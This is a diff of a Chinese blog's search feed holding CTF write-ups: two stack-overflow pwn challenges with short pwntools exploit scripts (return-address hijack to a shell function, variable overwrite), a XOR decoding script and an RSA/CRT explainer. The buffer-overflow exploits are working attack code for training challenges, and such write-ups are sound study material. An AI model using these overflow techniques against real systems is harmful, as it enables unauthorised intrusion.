+<p>&lt;img src = '<a href="https://ftp.bmp.ovh/imgs/2021/02/2488b83b697b9b94.png">https://ftp.bmp.ovh/imgs/2021/02/2488b83b697b9b94.png</a>' /&gt;</p>
 ]]></content>
       <categories>
-        <category>wp</category>
+        <category>wiki</category>
       </categories>
       <tags>
-        <tag>misc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ciscn_2019_n_1</title>
-    <url>/2021/01/27/ciscn-2019-n-1/</url>
-    <content><![CDATA[<p>可能是栈溢出吗</p>
-<a id="more"></a>
-<h2 id="先放出pwn的checksec"><a href="#先放出pwn的checksec" class="headerlink" title="先放出pwn的checksec"></a>先放出pwn的checksec</h2><img src="https://i.loli.net/2021/01/27/nB356Ro1mZPaT7K.png" >
-
-<p>64位且栈堆不可执行</p>
-<h2 id="IDA打开"><a href="#IDA打开" class="headerlink" title="IDA打开"></a>IDA打开</h2><img src="https://i.loli.net/2021/01/27/M7mdhurN319ifJo.png" >
-
-<p>gets是可以溢出的,但没必要;这一题我们只要覆盖到v2,然后让v2==11.28125就可以了.</p>
-<p>因此gets时先覆盖b’a’*(0x30-0x04)即可到v2的部分,再跟上11.28125的十六进制数即可成功获取flag.</p>
-<img src="https://i.loli.net/2021/01/27/r457DUpQKStM23l.png" >
-
-<p>通过在线转换我们获得16进制的浮点数.</p>
-<p>让我们开始payload吧.</p>
-<h2 id="构造exp如下"><a href="#构造exp如下" class="headerlink" title="构造exp如下"></a>构造exp如下</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-h<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"node3.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">28466</span><span class="token punctuation">)</span>
-payload<span class="token operator">=</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41348000</span><span class="token punctuation">)</span>
-h<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-h<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>最后执行得到flag<br><img src="https://i.loli.net/2021/01/27/biPjdpe4F3ULZ5V.png" ></p>
-<p>flag{3220e461-4bf7-4910-8abc-19873d83291c}</p>
-<h3 id="贴一个在线进制转换"><a href="#贴一个在线进制转换" class="headerlink" title="贴一个在线进制转换"></a>贴一个在线进制转换</h3><p><a href="https://lostphp.com/hexconvert/">CLICK ME</a></p>
-]]></content>
-      <categories>
-        <category>wp</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
+        <tag>crypto</tag>
       </tags>
   </entry>
   <entry>
     <title>Rip覆盖</title>
     <url>/2021/01/27/Rip%E8%A6%86%E7%9B%96/</url>
-    <content><![CDATA[<p>实属栈溢出.</p>
-<a id="more"></a>
-<img src="https://i.loli.net/2021/01/27/LsrJ4dpjkzXOnQl.png" >
-
-<h2 id="启动IDA"><a href="#启动IDA" class="headerlink" title="启动IDA"></a>启动IDA</h2><img src="https://i.loli.net/2021/01/27/6YANSFgolme5ZDB.png" >
-
-<p>这个gets没有限制输入,存在栈溢出漏洞.</p>
-<img src="https://i.loli.net/2021/01/27/MtCuZR9sfJaQdoV.png" >
-
-<p>需要我们输入来获取flag;</p>
-<p>在main函数下还有一个fun函数;我们可以点开看看看</p>
-<img src="https://i.loli.net/2021/01/27/TatPnLBF3CpOQsi.png" >
-
-<p>是一个系统调用且start at 401186(待会payload可以用到)</p>
-<p>双击s来到stack of main视图,这里了解了我们只需存入15个字节即可劫持函数返回地址<br><img src = 'https://ftp.bmp.ovh/imgs/2021/01/e6e423001264fe86.png' /></p>
-<p>IDA方面进行的差不多了,下面可以开始着手写脚本了</p>
-<h2 id="构造exp"><a href="#构造exp" class="headerlink" title="构造exp"></a>构造exp</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-h<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">27829</span><span class="token punctuation">)</span>
-payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">15</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x401186</span><span class="token punctuation">)</span>
-h<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-h<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h2><img src = 'https://ftp.bmp.ovh/imgs/2021/01/3b7387aaa01d232f.png' />
-
-<p>刚开始还不知道要干什么,以为又是脚本写错了,后来才发觉是要执行cat /flag命令</p>
-<img src = 'https://ftp.bmp.ovh/imgs/2021/01/ff3701318adda06f.png' />
-
-<p>get flag{8bf972eb-867d-485b-94d5-737f5bc12947}</p>
+    <content><![CDATA[<p>实属栈溢出.<br />
+<a id="more"></a><br />
+&lt;img src=&quot;<a href="https://i.loli.net/2021/01/27/LsrJ4dpjkzXOnQl.png">https://i.loli.net/2021/01/27/LsrJ4dpjkzXOnQl.png</a>&quot; &gt;</p>
+<h2 id="启动ida"><a class="anchor" href="#启动ida">#</a> 启动 IDA</h2>
+<p>&lt;img src=&quot;<a href="https://i.loli.net/2021/01/27/6YANSFgolme5ZDB.png">https://i.loli.net/2021/01/27/6YANSFgolme5ZDB.png</a>&quot; &gt;</p>
+<p>这个 gets 没有限制输入，存在栈溢出漏洞.</p>
+<p>&lt;img src=&quot;<a href="https://i.loli.net/2021/01/27/MtCuZR9sfJaQdoV.png">https://i.loli.net/2021/01/27/MtCuZR9sfJaQdoV.png</a>&quot; &gt;</p>
+<p>需要我们输入来获取 flag;</p>
+<p>在 main 函数下还有一个 fun 函数；我们可以点开看看看</p>
+<p>&lt;img src=&quot;<a href="https://i.loli.net/2021/01/27/TatPnLBF3CpOQsi.png">https://i.loli.net/2021/01/27/TatPnLBF3CpOQsi.png</a>&quot; &gt;</p>
+<p>是一个系统调用且 start at 401186 (待会 payload 可以用到)</p>
+<p>双击 s 来到 stack of main 视图，这里了解了我们只需存入 15 个字节即可劫持函数返回地址<br />
+ &lt; img src = '<a href="https://ftp.bmp.ovh/imgs/2021/01/e6e423001264fe86.png">https://ftp.bmp.ovh/imgs/2021/01/e6e423001264fe86.png</a>' /&gt;</p>
+<p>IDA 方面进行的差不多了，下面可以开始着手写脚本了</p>
+<h2 id="构造exp"><a class="anchor" href="#构造exp">#</a> 构造 exp</h2>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre>h<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">27829</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">15</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x401186</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>h<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>h<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h2 id="执行"><a class="anchor" href="#执行">#</a> 执行</h2>
+<p>&lt;img src = '<a href="https://ftp.bmp.ovh/imgs/2021/01/3b7387aaa01d232f.png">https://ftp.bmp.ovh/imgs/2021/01/3b7387aaa01d232f.png</a>' /&gt;</p>
+<p>刚开始还不知道要干什么，以为又是脚本写错了，后来才发觉是要执行 cat /flag 命令</p>
+<p>&lt;img src = '<a href="https://ftp.bmp.ovh/imgs/2021/01/ff3701318adda06f.png">https://ftp.bmp.ovh/imgs/2021/01/ff3701318adda06f.png</a>' /&gt;</p>
+<p 8bf972eb-867d-485b-94d5-737f5bc12947="">get flag</p>
 ]]></content>
       <categories>
         <category>wp</category>
@@ -474,34 +159,21 @@ h<span class="token punctuation">.</span>interactive<span class="token punctuati
   <entry>
     <title>XOR</title>
     <url>/2021/01/28/XOR/</url>
-    <content><![CDATA[<p>关于python xor的脚本</p>
-<a id="more"></a>
-<h2 id="IDA打开看看"><a href="#IDA打开看看" class="headerlink" title="IDA打开看看"></a>IDA打开看看</h2><p>找到main函数,我们看到有异或字符,和global比较,相同的话就获得flag</p>
-<img src = 'https://ftp.bmp.ovh/imgs/2021/01/f878bebf3c3e1066.png' />
-
-<li>第9行得知flag的长度为33</li>
-
-<li>第13行比较v6和global处存放的前31位字符是否相同;相同则输出success</li>
-
-<li>从main函数里面可以得到V6的处理方式为v6[i]等于v6[i]原来的值与v6[i-1]按位异或.</li>
-
-<h2 id="查看global字符串"><a href="#查看global字符串" class="headerlink" title="查看global字符串"></a>查看global字符串</h2><img src = 'https://ftp.bmp.ovh/imgs/2021/01/827aed457e7cd92a.png' />
-
-<h2 id="编写解密脚本"><a href="#编写解密脚本" class="headerlink" title="编写解密脚本"></a>编写解密脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token string">'k'</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token string">'w&amp;O.@'</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token string">'x'</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token string">'Z;U'</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token string">'p'</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token string">'F'</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token string">'v"M#D'</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token string">'g'</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token string">'h'</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token string">'G2O'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span>
-
-ss <span class="token operator">=</span> <span class="token string">'fkw&amp;O.@xZ;UpFv"M#DghG2O'</span>
-
-x <span class="token operator">=</span> <span class="token string">"f"</span>
-
-a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">107</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">118</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">71</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">79</span> <span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token comment">#字符串转换成10进制</span>
-
-<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-	x <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>a<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">#对应v6</span>
-
-<span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>拿到flag：flag{QianQiuWanDai_YiTongJiangHu}</p>
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.runoob.com/python/python-operators.html">https://www.runoob.com/python/python-operators.html</a><br><a href="https://blog.csdn.net/weixin_44731100/article/details/89156141">https://blog.csdn.net/weixin_44731100/article/details/89156141</a></p>
+    <content><![CDATA[<p>关于 python xor 的脚本<br />
+<a id="more"></a></p>
+<h2 id="ida打开看看"><a class="anchor" href="#ida打开看看">#</a> IDA 打开看看</h2>
+<p>找到 main 函数，我们看到有异或字符，和 global 比较，相同的话就获得 flag</p>
+<p>&lt;img src = '<a href="https://ftp.bmp.ovh/imgs/2021/01/f878bebf3c3e1066.png">https://ftp.bmp.ovh/imgs/2021/01/f878bebf3c3e1066.png</a>' /&gt;</p>
+<p>&lt;li&gt; 第 9 行得知 flag 的长度为 33&lt;/li&gt;</p>
+<p>&lt;li&gt; 第 13 行比较 v6 和 global 处存放的前 31 位字符是否相同；相同则输出 success&lt;/li&gt;</p>
+<p>&lt;li&gt; 从 main 函数里面可以得到 V6 的处理方式为 v6 [i] 等于 v6 [i] 原来的值与 v6 [i-1] 按位异或.&lt;/li&gt;</p>
+<h2 id="查看global字符串"><a class="anchor" href="#查看global字符串">#</a> 查看 global 字符串</h2>
+<p>&lt;img src = '<a href="https://ftp.bmp.ovh/imgs/2021/01/827aed457e7cd92a.png">https://ftp.bmp.ovh/imgs/2021/01/827aed457e7cd92a.png</a>' /&gt;</p>
+<h2 id="编写解密脚本"><a class="anchor" href="#编写解密脚本">#</a> 编写解密脚本</h2>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>s <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token string">'k'</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token string">'w&amp;O.@'</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token string">'x'</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token string">'Z;U'</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token string">'p'</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token string">'F'</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token string">'v"M#D'</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token string">'g'</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token string">'h'</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token string">'G2O'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>ss <span class="token operator">=</span> <span class="token string">'fkw&amp;O.@xZ;UpFv"M#DghG2O'</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>x <span class="token operator">=</span> <span class="token string">"f"</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">107</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">118</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">71</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">79</span> <span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token comment">#字符串转换成 10 进制</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	x <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>a<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">#对应 v6</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span></pre></td></tr></table></figure><p QianQiuWanDai_YiTongJiangHu="">拿到 flag：flag</p>
+<h3 id="参考"><a class="anchor" href="#参考">#</a> 参考</h3>
+<p>&lt;a href=&quot;<a href="https://www.runoob.com/python/python-operators.html">https://www.runoob.com/python/python-operators.html</a>&quot;&gt;<a href="https://www.runoob.com/python/python-operators.html">https://www.runoob.com/python/python-operators.html</a>&lt;/a&gt;<br />
+&lt;a href=&quot;<a href="https://blog.csdn.net/weixin_44731100/article/details/89156141">https://blog.csdn.net/weixin_44731100/article/details/89156141</a>&quot;&gt;<a href="https://blog.csdn.net/weixin_44731100/article/details/89156141">https://blog.csdn.net/weixin_44731100/article/details/89156141</a>&lt;/a&gt;</p>
 ]]></content>
       <categories>
         <category>wp</category>
@@ -511,54 +183,208 @@ a <span class="token operator">=</span> <span class="token punctuation">[</span>
       </tags>
   </entry>
   <entry>
-    <title>RSA加密算法详细解说</title>
-    <url>/2021/02/08/RSA%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E8%AF%A6%E7%BB%86%E8%A7%A3%E8%AF%B4/</url>
-    <content><![CDATA[<p>RSA加密算法是一种非对称加密算法,加密由公钥,私钥,明文,密文四部分组成.</p>
-<a id="more"></a>
-<h2 id="取模运算"><a href="#取模运算" class="headerlink" title="取模运算"></a>取模运算</h2><p>a mod n ≡ b表示a与b对模n同余(a,b分别除以n)</p>
-<li>举个栗子: 3 mod 2 ≡ 1 <--> 1mod2=1且3mod2=1</li>
-
-<h2 id="欧拉函数"><a href="#欧拉函数" class="headerlink" title="欧拉函数"></a>欧拉函数</h2><p>任意给定正整数n，计算在小于等于n的正整数之中，有多少个与n构成互质关系？计算这个值的方法就叫做欧拉函数，以φ(n)表示.</p>
-<li>例如，在1到8之中，与8形成互质关系的是1、3、5、7，所以φ(n)=4</li>
-
-<h3 id="在RSA算法中，欧拉函数对以下定理成立"><a href="#在RSA算法中，欧拉函数对以下定理成立" class="headerlink" title="在RSA算法中，欧拉函数对以下定理成立"></a>在RSA算法中，欧拉函数对以下定理成立</h3><p>1.如果n可以分解成两个互质的整数之积，即n=p×q，则有：φ(n)=φ(pq)=φ( p )φ( q );<br>2.当p为质数，φ( p )=p-1</p>
-<p>所以有φ(n)=(p-1)(q-1)</p>
-<h2 id="欧拉定理与模反元素"><a href="#欧拉定理与模反元素" class="headerlink" title="欧拉定理与模反元素"></a>欧拉定理与模反元素</h2><p>欧拉函数的用处，在于欧拉定理<br>“欧拉定理”指的是:<br>如果两个正整数a和n互质，则n的欧拉函数φ(n)可以让下面的等式成立：<br>a^φ(n)≡1(modn)<br>也就是说，a的φ(n)次方被n除的余数为1</p>
-<h3 id="模反元素的推导过程如下"><a href="#模反元素的推导过程如下" class="headerlink" title="模反元素的推导过程如下:"></a>模反元素的推导过程如下:</h3><p>根据欧拉定理，有：<br>a^φ(n) = a × a^(φ(n)−1)≡1(modn)</p>
-<p>令b=a^(φ(n)−1)，得：</p>
-<p>ab≡1(modn)</p>
-<li>b就是a的模反元素</li>
-<li>所以，如果两个正整数a和n互质，那么一定可以找到整数b使得ab-1被n整除，或者说ab被n除的余数是1</li>
-
-<li>所以求私钥d的公式：d*e≡1mod[(p-1)(q-1)]</li>
-
-<p>代入φ(n) = (p-1)(q-1),φ(n) 与e互质，k为正整数<br>可化为：d= (k*φ(n)+1)/e</p>
-<pre class="line-numbers language-html" data-language="html"><code class="language-html">公钥    n -->  两素数p、q之积
-        e -->  1&lt;e<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>(p-1)·(q-1)且e与乘积互质</span>
-<span class="token attr-name">私钥</span>    <span class="token attr-name">d</span> <span class="token attr-name">--</span><span class="token punctuation">></span></span>  d·e ≡ 1 mod[(p-1)·(q-1)]
-        n -->  同公钥n
-加密    ----->  C ≡ M^e mod(n)   M为明文
-解密    ----->  M ≡ C^d mod(n)   C为密文<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="由p-q-dp-dq-c求明文的算法"><a href="#由p-q-dp-dq-c求明文的算法" class="headerlink" title="由p,q,dp,dq,c求明文的算法"></a>由p,q,dp,dq,c求明文的算法</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2
-I <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>q<span class="token punctuation">,</span>p<span class="token punctuation">)</span>
-mp <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>dp<span class="token punctuation">,</span>p<span class="token punctuation">)</span>
-mq <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>dq<span class="token punctuation">,</span>q<span class="token punctuation">)</span>               <span class="token comment">#求幂取模运算</span>
-
-m <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>mp<span class="token operator">-</span>mq<span class="token punctuation">)</span><span class="token operator">*</span>I<span class="token punctuation">)</span><span class="token operator">%</span>p<span class="token punctuation">)</span><span class="token operator">*</span>q<span class="token operator">+</span>mq       <span class="token comment">#求明文公式</span>
-
-<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token comment">#转为十六进制</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<li>pow(a,b,c)表示 a^b%c 即a^b mod c</li>
-
-<h3 id="数学运算规律"><a href="#数学运算规律" class="headerlink" title="数学运算规律"></a>数学运算规律</h3><p>a^b%p = ((a%p)^b)%p<br>若a≡b(%p),则对任意的c,都有(a+c)≡(b+c)(%p)<br>若a≡b(%p),则对任意的c,都有(a<em>c)≡(b</em>c)(%p)<br>若a≡b(%p),对任意的c,都有c≡d(%p),那么(a+c)≡(b+d)(%p),(a<em>c)≡(b</em>d)(%p)</p>
-<p>运算推论:参考 <a href="https://blog.csdn.net/mikecoke/article/details/105967809?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-2&amp;spm=1001.2101.3001.4242">https://blog.csdn.net/mikecoke/article/details/105967809?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-2&amp;spm=1001.2101.3001.4242</a></p>
-<img src = 'https://ftp.bmp.ovh/imgs/2021/02/6477b861b60b9672.png' />
-
-<img src = 'https://ftp.bmp.ovh/imgs/2021/02/2488b83b697b9b94.png' />]]></content>
+    <title>ciscn_2019_n_1</title>
+    <url>/2021/01/27/ciscn-2019-n-1/</url>
+    <content><![CDATA[<p>可能是栈溢出吗<br />
+<a id="more"></a></p>
+<h2 id="先放出pwn的checksec"><a class="anchor" href="#先放出pwn的checksec">#</a> 先放出 pwn 的 checksec</h2>
+<p>&lt;img src=&quot;<a href="https://i.loli.net/2021/01/27/nB356Ro1mZPaT7K.png">https://i.loli.net/2021/01/27/nB356Ro1mZPaT7K.png</a>&quot; &gt;</p>
+<p>64 位且栈堆不可执行</p>
+<h2 id="ida打开"><a class="anchor" href="#ida打开">#</a> IDA 打开</h2>
+<p>&lt;img src=&quot;<a href="https://i.loli.net/2021/01/27/M7mdhurN319ifJo.png">https://i.loli.net/2021/01/27/M7mdhurN319ifJo.png</a>&quot; &gt;</p>
+<p>gets 是可以溢出的，但没必要；这一题我们只要覆盖到 v2, 然后让 v2==11.28125 就可以了.</p>
+<p>因此 gets 时先覆盖 b'a'*(0x30-0x04) 即可到 v2 的部分，再跟上 11.28125 的十六进制数即可成功获取 flag.</p>
+<p>&lt;img src=&quot;<a href="https://i.loli.net/2021/01/27/r457DUpQKStM23l.png">https://i.loli.net/2021/01/27/r457DUpQKStM23l.png</a>&quot; &gt;</p>
+<p>通过在线转换我们获得 16 进制的浮点数.</p>
+<p>让我们开始 payload 吧.</p>
+<h2 id="构造exp如下"><a class="anchor" href="#构造exp如下">#</a> 构造 exp 如下</h2>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre>h<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"node3.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">28466</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>payload<span class="token operator">=</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41348000</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>h<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>h<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>最后执行得到 flag<br />
+&lt;img src=&quot;<a href="https://i.loli.net/2021/01/27/biPjdpe4F3ULZ5V.png">https://i.loli.net/2021/01/27/biPjdpe4F3ULZ5V.png</a>&quot; &gt;</p>
+<p 3220e461-4bf7-4910-8abc-19873d83291c="">flag</p>
+<h3 id="贴一个在线进制转换"><a class="anchor" href="#贴一个在线进制转换">#</a> 贴一个在线进制转换</h3>
+<p>&lt;a href=&quot;<a href="https://lostphp.com/hexconvert/">https://lostphp.com/hexconvert/</a>&quot;&gt;CLICK ME&lt;/a&gt;</p>
+]]></content>
       <categories>
-        <category>wiki</category>
+        <category>wp</category>
       </categories>
       <tags>
-        <tag>crypto</tag>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctf.show-萌新web1-4</title>
+    <url>/2021/01/24/ctf-show-%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%921-7/</url>
+    <content><![CDATA[<p>简单记录 sql 绕过方法<br />
